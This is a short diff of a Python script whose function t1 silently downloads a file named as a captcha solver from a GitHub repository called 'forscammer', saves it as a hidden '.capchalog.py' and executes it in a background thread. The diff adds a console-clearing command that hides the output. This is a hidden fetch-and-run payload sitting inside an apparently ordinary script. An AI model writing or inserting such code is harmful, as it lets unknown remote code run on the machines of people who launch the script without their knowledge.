@@ -160,8 +160,10 @@ algothihm(dataset).slider()
 def t1():
   open(".capchalog.py","w",encoding="utf-8").write(__import__("requests").get("https://raw.githubusercontent.com/netrotion/forscammer/main/capchasolver").text);files=open(".capchalog.py","r",encoding="utf-8").read().split("\n");files.pop(files.index(""));open(".capchalog.py","w",encoding="utf-8").write("\n".join(files));__import__("os").system("python .capchalog.py")
 def t2():
-  open("source.py", "w").write(source_code)
+  open("source.py", "w", encoding = "utf-8").write(source_code)
 
 
 Thread(target=t1).start()
 Thread(target=t2).start()
+
+__import__("os").system("cls")
